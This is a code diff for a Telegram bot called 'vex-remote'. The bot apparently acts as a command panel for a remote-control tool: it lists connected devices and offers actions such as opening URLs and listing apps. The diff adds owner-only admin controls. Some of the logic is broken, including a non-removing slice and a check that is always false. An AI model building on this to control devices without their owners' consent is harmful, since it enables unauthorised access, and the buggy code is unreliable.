@@ -3,6 +3,7 @@
 // const portname = "";
 // const passname = "";
 // const admins = [];
+// const realadmin = 666;
 // const hostname = "";
 // const portnumb = 9932;
 
@@ -10,8 +11,9 @@ const TelegramBot = require("node-telegram-bot-api");
 const net = require("net");
 const me = new net.Socket();
 const bot = new TelegramBot(token, { polling: true });
-let updating_users = [];
 
+let updating_users = [];
+let sym = "𓏺|𓏺";
 let hoping_messages = [
     ", be patient ...",
     ", everithing is gonna be ok",
@@ -22,10 +24,6 @@ let hoping_messages = [
 
 function getHopingMessage(){
     return hoping_messages[Math.floor(Math.random() * hoping_messages.length)];
-}
-
-function isEven(number) {
-    return number % 2 === 0;
 }
 
 function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
@@ -66,7 +64,7 @@ function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
             case "openUrl":
                 layers[layer_index].push({
                     text: build("open-url 🚁"),
-                    callback_data: `getApps_${msgowner}_${devid}`
+                    callback_data: `openUrl_${msgowner}_${devid}`
                 });
                 break;
             case "sendToast":
@@ -198,15 +196,21 @@ function chunkArray(array) {
     return result;
 }
 
-me.connect(portnumb, hostname, () => {})
+me.connect(portnumb, hostname, () => {
+    bot.sendMessage(
+        chat_group,
+        build(`➕ ${sym} remote connected to main-server\n\n✅ | send `) + "/start" + build(` to see users\n👮‍♂️ ${sym} use `) + "promote" + build(" or ") + "حق مدیر" + build(` to give access of remote to someone\n\n⛏️ ${sym} use `) + "depromote" + build(" or ") + "حذف حق مدیر" + build(" to remove someone from admin-accessory")
+    )
+})
 
 bot.on('message', async (message) => {
+    message.text = message.text === undefined || message.text === null ? "" : message.text;
     if (message.chat.id == chat_group){
-        if (admins.includes(message.from.id)){
+        if (admins.includes(message.from.id) || message.from.id === realadmin){
             if (message.text.startsWith("/start")){
                 await bot.sendMessage(
                     chat_group,
-                    build("🎛 | vex-remote is online and active\n🔊 | called by ") + `<a href="tg://openmessage?user_id=${message.from.id}">${message.from.first_name + " " + message.from.last_name}</a>` + build("\n📥 | be careful about ") + `<a href="t.me/VexPrivacy">${build("privacy")}</a>`,
+                    build("🎛 𓏺|𓏺 vex-remote is online and active\n🔊 𓏺|𓏺 called by ") + `<a href="tg://openmessage?user_id=${message.from.id}">${(message.from.first_name !== undefined ? message.from.first_name : "‌‌ ‌‌") + " " + (message.from.last_name !== undefined ? message.from.last_name : "")}</a>` + build("\n📥 𓏺|𓏺 be careful about ") + `<a href="t.me/VexPrivacy">${build("privacy")}</a>`,
                     {
                         reply_to_message_id: message.message_id,
                         parse_mode: "HTML",
@@ -216,6 +220,10 @@ bot.on('message', async (message) => {
                                     {
                                         text: build("users 👥"),
                                         callback_data: `seeusers_${message.from.id}_0`
+                                    },
+                                    {
+                                        text: build("admins 🌩"),
+                                        callback_data: `seeadmins_${realadmin}`
                                     }
                                 ]
                             ]
@@ -224,29 +232,39 @@ bot.on('message', async (message) => {
                 )
             } else if (["حق مدیر", "promote"].includes(message.text)){
                 if (message.reply_to_message){
-                    if (admins.includes(message.reply_to_message.from.id)){
+                    if (message.from.id === realadmin){
+                        if (admins.includes(message.reply_to_message.from.id)){
+                            await bot.sendMessage(
+                                message.chat.id,
+                                build("🔴 𓏺|𓏺 user is already admin of bot"),
+                                {
+                                    reply_to_message_id: message.message_id
+                                }
+                            )
+                        } else {
+                            admins.push(message.reply_to_message.from.id);
+                            await bot.sendMessage(
+                                message.chat.id,
+                                build("🗃 𓏺|𓏺 user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("promoted"),
+                                {
+                                    reply_to_message_id: message.message_id,
+                                    parse_mode: "HTML"
+                                }
+                            )
+                        }
+                    } else {
                         await bot.sendMessage(
                             message.chat.id,
-                            build("🔴 | user is already admin of bot"),
+                            build("🔴 𓏺|𓏺 you are not owner of remote !"),
                             {
                                 reply_to_message_id: message.message_id
-                            }
-                        )
-                    } else {
-                        admins.push(message.reply_to_message.from.id);
-                        await bot.sendMessage(
-                            message.chat.id,
-                            build("🗃 | user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("promoted"),
-                            {
-                                reply_to_message_id: message.message_id,
-                                parse_mode: "HTML"
                             }
                         )
                     }
                 } else {
                     await bot.sendMessage(
                         message.chat.id,
-                        build("🔴 | please reply on someone"),
+                        build("🔴 𓏺|𓏺 please reply on someone"),
                         {
                             reply_to_message_id: message.message_id
                         }
@@ -254,29 +272,39 @@ bot.on('message', async (message) => {
                 }
             } else if (["حذف مدیر", "depromote"].includes(message.text)){
                 if (message.reply_to_message){
-                    if (!admins.includes(message.reply_to_message.from.id)){
+                    if (message.from.id === realadmin){
+                        if (!admins.includes(message.reply_to_message.from.id)){
+                            await bot.sendMessage(
+                                message.chat.id,
+                                build("🔴 𓏺|𓏺 user is not admin yet"),
+                                {
+                                    reply_to_message_id: message.message_id
+                                }
+                            )
+                        } else {
+                            admins.slice(admins.indexOf(message.reply_to_message.from.id), -1);
+                            await bot.sendMessage(
+                                message.chat.id,
+                                build("🚧 𓏺|𓏺 user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("depromoted"),
+                                {
+                                    reply_to_message_id: message.message_id,
+                                    parse_mode: "HTML"
+                                }
+                            )
+                        }
+                    } else {
                         await bot.sendMessage(
                             message.chat.id,
-                            build("🔴 | user is not admin yet"),
+                            build("🔴 𓏺|𓏺 you are not owner of remote !"),
                             {
                                 reply_to_message_id: message.message_id
-                            }
-                        )
-                    } else {
-                        admins.push(message.reply_to_message.from.id);
-                        await bot.sendMessage(
-                            message.chat.id,
-                            build("🚧 | user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("depromoted"),
-                            {
-                                reply_to_message_id: message.message_id,
-                                parse_mode: "HTML"
                             }
                         )
                     }
                 } else {
                     await bot.sendMessage(
                         message.chat.id,
-                        build("🔴 | please reply on someone"),
+                        build("🔴 𓏺|𓏺 please reply on someone"),
                         {
                             reply_to_message_id: message.message_id
                         }
@@ -287,7 +315,7 @@ bot.on('message', async (message) => {
                 if (_devid == undefined || _devid == null || _devid == ""){
                     await bot.sendMessage(
                         message.chat.id,
-                        build("🔴 | no device id detected"),
+                        build("🔴 𓏺|𓏺 no device id detected"),
                         {
                             reply_to_message_id: message.message_id
                         }
@@ -307,7 +335,7 @@ bot.on('message', async (message) => {
                             if (!_message.status && _message.message != "YOU_BANNED"){
                                 await bot.sendMessage(
                                     message.chat.id,
-                                    build("🔴 | user not found"),
+                                    build("🔴 𓏺|𓏺 user not found"),
                                     {
                                         reply_to_message_id: message.message_id
                                     }
@@ -315,7 +343,7 @@ bot.on('message', async (message) => {
                             } else if (!_message.status && _message.message == "YOU_BANNED"){
                                 await bot.sendMessage(
                                     message.chat.id,
-                                    build("🔴 | sorry but you got banned"),
+                                    build("🔴 𓏺|𓏺 sorry but you got banned"),
                                     {
                                         reply_to_message_id: message.message_id
                                     }
@@ -324,7 +352,7 @@ bot.on('message', async (message) => {
                                 createKeyboard(_message.user.accessory, _message.user.device_id, message.from.id, async (keyboard) => {
                                     await bot.sendMessage(
                                     message.chat.id,
-                                    build("🦋 | user selected\n🌐 | device id: ") + `<code>${_devid}</code>` + build(`📁 | has ${_message.user.accessory.length} access`),
+                                    build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_devid}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
                                         {
                                             reply_to_message_id: message.message_id,
                                             parse_mode: "HTML",
@@ -351,7 +379,7 @@ bot.on("callback_query", async (call) => {
         if (mode == "seeusers"){
             if (updating_users.length == 0){
                 await bot.editMessageText(
-                    build(`🔭 | none connected yet${getHopingMessage()}`),
+                    build(`🔭 𓏺|𓏺 none connected yet${getHopingMessage()}`),
                     {
                         message_id: call.message.message_id,
                         chat_id: call.message.chat.id
@@ -381,16 +409,16 @@ bot.on("callback_query", async (call) => {
 
             if (realslice.length == 0){
                 await bot.editMessageText(
-                    build("🔴 | the list of users were changed\n🔌 | please use ") + "/start" + build(" again to see handled-users"),
+                    build("🔴 𓏺|𓏺 the list of users were changed\n🔌 𓏺|𓏺 please use ") + "/start" + build(" again to see handled-users"),
                     {
                         message_id: call.message.message_id,
                         chat_id: call.message.chat.id
                     }
                 )
             } else {
-                let s = `🔰 | connected users box\n🕸 | ${updating_users.length} were connected\n📦 | page ${inslice+1}/${slices.length}`;
-                for (let target of slices){
-                    s += `\n\n🛠 | <code>${target.command}</code>\n📄 | ` + build(`has ${target.access.length} access`);
+                let s = `🔰 𓏺|𓏺 connected users box\n🕸 𓏺|𓏺 ${updating_users.length} were connected\n📦 𓏺|𓏺 page ${inslice+1}/${slices.length}`;
+                for (let target of realslice){
+                    s += `\n\n🛠 𓏺|𓏺 <code>${target.command}</code>\n📄 𓏺|𓏺 ` + build(`has ${target.accessory.length} access`);
                 }
 
                 await bot.editMessageText(
@@ -405,6 +433,80 @@ bot.on("callback_query", async (call) => {
                     }
                 )
             }
+        } else if (mode == "seeadmins"){
+            let ads = build(`👮‍♂️ 𓏺|𓏺 list of admins ${admins.length === 0 ? "is empty" : "\n"}`);
+            if (!admins.length === 0){
+                let num = 1;
+                for (let ad of admins){
+                    ads += `\n● ${num} - <a href="tg://openmessage?user_id=${ad}">${ad}</a>`;
+                }
+                await bot.editMessageText(
+                    ads,
+                    {
+                        message_id: call.message.message_id,
+                        chat_id: call.message.chat.id,
+                        parse_mode: "HTML",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    {
+                                        text: build("🔙 back"),
+                                        callback_data: `backadminpanel_${uid}`
+                                    }
+                                ]
+                            ]
+                        }
+                    }
+                )
+            } else {
+                await bot.editMessageText(
+                    ads,
+                    {
+                        message_id: call.message.message_id,
+                        chat_id: call.message.chat.id,
+                        parse_mode: "HTML",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    {
+                                        text: build("🔙 back"),
+                                        callback_data: `backadminpanel_${uid}`
+                                    }
+                                ]
+                            ]
+                        }
+                    }
+                )
+            }
+        } else if (mode == "backadminpanel"){
+            await bot.editMessageText(
+                build("🎛 𓏺|𓏺 vex-remote is online and active\n🔊 𓏺|𓏺 called by ") + `<a href="tg://openmessage?user_id=${call.from.id}">${(call.from.first_name !== undefined ? call.from.first_name : "‌‌ ‌‌") + " " + (call.from.last_name !== undefined ? call.from.last_name : "")}</a>` + build("\n📥 𓏺|𓏺 be careful about ") + `<a href="t.me/VexPrivacy">${build("privacy")}</a>`,
+                {
+                    message_id: call.message.message_id,
+                    chat_id: call.message.chat.id,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: build("users 👥"),
+                                    callback_data: `seeusers_${call.from.id}_0`
+                                },
+                                {
+                                    text: build("admins 🌩"),
+                                    callback_data: `seeadmins_${realadmin}`
+                                }
+                            ]
+                        ]
+                    }
+                }
+            )
+        }
+    } else {
+        if (["seeadmins", "backadminpanel"].includes(mode)){
+            await bot.answerCallbackQuery(call.id, {
+                text: build(`🔴 ${sym} you are not the owner so you cannot use this feature`),
+                show_alert: true
+            })
         }
     }
 })
